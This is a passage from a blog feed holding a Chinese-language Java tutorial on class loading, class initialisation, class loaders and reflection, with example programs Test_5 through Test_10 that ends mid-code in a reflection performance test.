class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java JavaBase</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java_base_注释与反射_3</title>
    <link href="/2021/04/08/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_3/"/>
    <url>/2021/04/08/Java/JavaBase/java_base_%E6%B3%A8%E9%87%8A%E4%B8%8E%E5%8F%8D%E5%B0%84_3/</url>
    
    <content type="html"><![CDATA[<h1 id="注释与反射学习——-3"><a href="#注释与反射学习——-3" class="headerlink" title="注释与反射学习—— 3"></a>注释与反射学习—— 3</h1><h2 id="Java内存分析"><a href="#Java内存分析" class="headerlink" title="Java内存分析"></a>Java内存分析</h2><ul><li><p>加载:将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后生成一个代表这个类的java.lang.Class对象.</p></li><li><p>链接:将Java类的二进制代码合并到JVM的运行状态之中的过程。</p><ul><li><p>验证:确保加载的类信息符合JVM规范，没有安全方面的问题</p></li><li><p>准备∶正式为类变量(static)分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。</p></li><li><p>解析:虚拟机常量池内的符号引用（常量名）替换为直接引用（地址)的过程。</p></li></ul></li><li><p>初始化</p><ul><li>执行类构造器<clinit>()方法的过程。类构造器<clinit>()方法是由编译期自动收集类中所有类变量的赋值动作和静态代码块中的语句合并产生的。(类构造器是构造类信息的，不是构造该类对象的构造器）。</li><li>当初始化一个类的时候，如果发现其父类还没有进行初始化，则需要先触发其父类的初始化。</li><li>虚拟机会保证一个类的<clinit>()方法在多线程环境中被正确加锁和同步。</li></ul></li></ul><p>Test_5.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        A a=<span class="hljs-keyword">new</span> A();<br>        System.out.println(a.m);<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * 1.加载到内存，会产生一个类对相应的Class对象</span><br><span class="hljs-comment">        * 2.链接，链接结束后m=0</span><br><span class="hljs-comment">        * 3.初始化</span><br><span class="hljs-comment">        static int m=100;</span><br><span class="hljs-comment">        static &#123;</span><br><span class="hljs-comment">            System.out.println(&quot;A类静态代码块初始化&quot;);</span><br><span class="hljs-comment">            m=300;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        */</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-comment">//根据m赋值的先后顺序获得相应的数值</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> m=<span class="hljs-number">100</span>;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;A类静态代码块初始化&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">A</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;A类的无参构造初始化&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="什么时候会发生类的初始化"><a href="#什么时候会发生类的初始化" class="headerlink" title="什么时候会发生类的初始化"></a>什么时候会发生类的初始化</h2><ul><li>类的主动引用(一定会发生类的初始化)<ul><li>当虚拟机启动，先初始化main方法所在的类</li><li>new一个类的对象</li><li>调用类的静态成员（除了final常量)和静态方法</li><li>使用java.lang.reflect包的方法对类进行反射调用</li><li>当初始化一个类，如果其父类没有被初始化，则先会初始化它的父类</li></ul></li><li>类的被动引用(不会发生类的初始化)<ul><li>当访问一个静态域时，只有真正声明这个域的类才会被初始化。如:当通过子类引用父类的静态变量，不会导致子类初始化</li><li>通过数组定义类引用，不会触发此类的初始化</li><li>引用常量不会触发此类的初始化（常量在链接阶段就存入调用类的常量池中了)</li></ul></li></ul><p>Test_6.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//测试类什么时候会初始化</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_6</span> </span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Main被加载&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">//1.主动引用</span><br>        <span class="hljs-comment">//Son son=new Son();</span><br><br>        <span class="hljs-comment">//反射也会产生主动引用</span><br>        <span class="hljs-comment">//Class.forName(&quot;ll.注解与反射.Son&quot;);</span><br><br>        <span class="hljs-comment">//不会产生类的引用的方法</span><br>        System.out.println(Son.b);<br><br>        Son[] arrays=<span class="hljs-keyword">new</span> Son[<span class="hljs-number">5</span>];<br>        System.out.println(Son.M);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Father</span></span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;父类被加载&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> b=<span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Father</span></span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;子类被加载&quot;</span>);<br>        m=<span class="hljs-number">300</span>;<br>    &#125;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> m=<span class="hljs-number">30</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> M=<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="类加载器的作用"><a href="#类加载器的作用" class="headerlink" title="类加载器的作用"></a>类加载器的作用</h2><ul><li>类加载的作用:将class文件字节码内容加载到内存中，并将这些静态数据转换成方法区的运行时数据结构，然后在堆中生成一个代表这个类的java.lang.Class对象，作为方法区中类数据的访问入口。</li><li>类缓存︰标准的JavaSE类加载器可以按要求查找类，但一旦某个类被加载到类加载器中，它将维持加载（缓存）一段时间。不过JVM垃圾回收机制可以回收这些Class对象</li></ul><p>Test_7.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_7</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">//获取系统类的加载器</span><br>        ClassLoader systemClassLoader=ClassLoader.getSystemClassLoader();<br>        System.out.println(systemClassLoader);<br><br>        <span class="hljs-comment">//获取系统类加载器的父类加载器--&gt;拓展类加载器</span><br>        ClassLoader parent=systemClassLoader.getParent();<br>        System.out.println(parent);<br><br>        <span class="hljs-comment">//获取拓展类加载器的父类加载器--&gt;根加载器（c/c++）(无法直接获取根加载器)</span><br>        ClassLoader parent1=parent.getParent();<br>        System.out.println(parent1);<br><br><br>        <span class="hljs-comment">//测试当前类是哪一个加载器加载的</span><br>        ClassLoader classLoader = Class.forName(<span class="hljs-string">&quot;ll.注解与反射.Test_7&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//测试JDK内置的类是谁加载的</span><br>        classLoader= Class.forName(<span class="hljs-string">&quot;java.lang.Object&quot;</span>).getClassLoader();<br>        System.out.println(classLoader);<br><br>        <span class="hljs-comment">//如何获取系统类加载可以加载的路径</span><br>        System.out.println(System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>));<br>        <br>        <span class="hljs-comment">//双亲委派机制</span><br>            <span class="hljs-comment">//java.lang.String--&gt;</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\charsets.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\deploy.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\access-bridge-32.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\cldrdata.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\dnsns.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\jaccess.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\jfxrt.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\localedata.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\nashorn.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\sunec.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\sunjce_provider.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\sunmscapi.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\sunpkcs11.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\ext\zipfs.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\javaws.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\jce.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\jfr.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\jfxswt.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\jsse.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\management-agent.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\plugin.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\resources.jar;</span><br><span class="hljs-comment">        * F:\java\jdk8_x32\jre\lib\rt.jar;</span><br><span class="hljs-comment">        * E:\code\java\empty\target\classes;</span><br><span class="hljs-comment">        * D:\maven\apache-maven-3.6.3\maven-repo\commons-io\commons-io\2.5\commons-io-2.5.jar;</span><br><span class="hljs-comment">        * D:\IntelliJIDEA\IntelliJ IDEA 2020.1\lib\idea_rt.jar</span><br><span class="hljs-comment">         */</span><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="获取类的运行时结构"><a href="#获取类的运行时结构" class="headerlink" title="获取类的运行时结构"></a>获取类的运行时结构</h2><p>Test_8.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">//获得类的信息</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_8</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, NoSuchMethodException </span>&#123;<br>        Class c1=Class.forName(<span class="hljs-string">&quot;ll.注解与反射.Test_8&quot;</span>);<br><br>        <span class="hljs-comment">//获得类的名字</span><br>        System.out.println(c1.getName());<span class="hljs-comment">//获得包名+类名</span><br>        System.out.println(c1.getSimpleName());<span class="hljs-comment">//获得类名</span><br>        <span class="hljs-comment">//获得类的属性</span><br>        System.out.println(<span class="hljs-string">&quot;++++++++++++&quot;</span>);<br><br>        Field[] fields=c1.getFields();<span class="hljs-comment">//只能找到public属性</span><br><br><br>        fields=c1.getDeclaredFields();<span class="hljs-comment">//可以获得全部属性</span><br>        <span class="hljs-keyword">for</span> (Field field:fields)&#123;<br>            System.out.println(field);<br>        &#125;<br>        <span class="hljs-comment">//获得指定属性的值</span><br>        Field name=c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br>        System.out.println(name);<br><br>        <span class="hljs-comment">//获得类的方法 同样获取全部，没有D就是公共</span><br>        Method[] methods=c1.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span> (Method method:methods)&#123;<br>            System.out.println(method);<br>        &#125;<br>        <span class="hljs-comment">//获得指定方法</span><br>        <span class="hljs-comment">//重载</span><br>        Method getName=c1.getDeclaredMethod(<span class="hljs-string">&quot;getName&quot;</span>,<span class="hljs-keyword">null</span>);<br>        Method setName=c1.getDeclaredMethod(<span class="hljs-string">&quot;gsetName&quot;</span>,String.class);<br>        System.out.println(getName);<br>        System.out.println(setName);<br>        <span class="hljs-comment">//获得全部构造器</span><br>        Constructor[] declaredConstructors = c1.getDeclaredConstructors();<br>        <span class="hljs-comment">//获得指定的构造器</span><br>        Constructor constructor=c1.getDeclaredConstructor(String.class,<span class="hljs-keyword">int</span>.class);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="动态的创建对象"><a href="#动态的创建对象" class="headerlink" title="动态的创建对象"></a>动态的创建对象</h2><ul><li>创建类的对象:调用Class对象的newlnstance()方法<ol><li>类必须有一个无参数的构造器长</li><li>类的构造器的访问权限需要足够</li></ol></li></ul><p>**思考?**难道没有无参的构造器就不能创建对象了吗?只要在操作的时候明确的调用类中的构造器，并将参数传递进去之后，才可以实例化操作。</p><ul><li>步骤如下:<ol><li>通过Class类的getDeclaredConstructor(Class … parameterTypes)取得本类的指定形参类型的构造器</li><li>向构造器的形参中传递一个对象数组进去，里面包含了构造器中所需的各个参数。</li><li>通过Constructor实例化对象</li></ol></li></ul><p>Test_9.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_9</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException </span>&#123;<br>        <span class="hljs-comment">//获得Class对象</span><br>        Class c1=Class.forName(<span class="hljs-string">&quot;ll.注解与反射.Dog&quot;</span>);<br><br><span class="hljs-comment">//        //构造一个对象</span><br><span class="hljs-comment">//        Dog dog=(Dog)c1.newInstance();//本质上是调用了无参构造器</span><br><span class="hljs-comment">//        System.out.println(dog);</span><br><br><span class="hljs-comment">//        //通过构造器创建对象</span><br><span class="hljs-comment">//        Constructor constructor = c1.getDeclaredConstructor(String.class, int.class);</span><br><span class="hljs-comment">//        Dog dog = (Dog) constructor.newInstance(&quot;lyx&quot;, 19);</span><br><span class="hljs-comment">//        System.out.println(dog);</span><br><br><span class="hljs-comment">//        //通过反射调用普通方法</span><br><span class="hljs-comment">//        Dog dog=(Dog)c1.newInstance();</span><br><span class="hljs-comment">//        //通过反射获取一个方法</span><br><span class="hljs-comment">//        Method setName=c1.getDeclaredMethod(&quot;setName&quot;,String.class);</span><br><span class="hljs-comment">//        //invoke激活的意思</span><br><span class="hljs-comment">//        //（对象，“方法的值”）</span><br><span class="hljs-comment">//        setName.invoke(dog,&quot;lyx&quot;);</span><br><span class="hljs-comment">//        System.out.println(dog.getName());</span><br><br>        <span class="hljs-comment">//通过反射操作属性</span><br>        Dog dog = (Dog) c1.newInstance();<br>        Field name=c1.getDeclaredField(<span class="hljs-string">&quot;name&quot;</span>);<br><br>        <span class="hljs-comment">//不能直接操作私有属性，我们需要关闭程序的安全检测，属性或方法是setAccessible(true)</span><br>        name.setAccessible(<span class="hljs-keyword">true</span>);<span class="hljs-comment">//关闭检测</span><br>        name.set(dog,<span class="hljs-string">&quot;lyx&quot;</span>);<br>        System.out.println(dog.getName());<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Dog&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Dog</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Dog</span><span class="hljs-params">(String name, <span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="性能对比分析"><a href="#性能对比分析" class="headerlink" title="性能对比分析"></a>性能对比分析</h2><p>Test_10.java</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">//分析性能问题</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test_10</span> </span>&#123;<br>    <span class="hljs-comment">//普通方法调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span>&#123;<br>        Dog dog=<span class="hljs-keyword">new</span> Dog(<span class="hljs-string">&quot;lyx&quot;</span>,<span class="hljs-number">18</span>);<br>        <span class="hljs-keyword">long</span> startTime=System.currentTimeMillis();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000000</span>; i++) &#123;<br>            dog.getName();<br>        &#125;<br>        <span class="hljs-keyword">long</span> endTime=System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;普通方法执行10^8的时间&quot;</span>+(endTime-startTime)+<span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//反射方式调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;<br>        Dog dog=<span class="hljs-keyword">new</span> Dog(<span class="hljs-string">&quot;lyx&quot;</span>,<span class="hljs-number">18</span>);<br>        Class c1=dog.getClass();<br>        Method getName = c1.getDeclaredMethod(<span class="hljs-string">&quot;getName&quot;</span>, <span class="hljs-keyword">null</span>);<br>        <span class="hljs-keyword">long</span> startTime=System.currentTimeMillis();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000000</span>; i++) &#123;<br>            getName.invoke(dog,<span class="hljs-keyword">null</span>);<br>        &#125;<br>        <span class="hljs-keyword">long</span> endTime=System.currentTimeMillis();<br>        System.out.println(<span class="hljs-string">&quot;反射方法执行10^8的时间&quot;</span>+(endTime-startTime)+<span class="hljs-string">&quot;ms&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//反射方式调用 关闭检测</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test3</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;<br>        Dog dog=<span class="hljs-keyword">new</span> Dog(<span class="hljs-string">&quot;lyx&quot;</span>,<span class="hljs-number">18</span>);<br>        Class c1=dog.getClass();<br>        Method getName = c1.getDeclaredMethod(<span class="hljs-string">&quot;getName&quot;</span>, <span class="hljs-keyword">null</span>);<br>        getName.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">long</span> startTime=System.currentTimeMillis();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000000</span>; 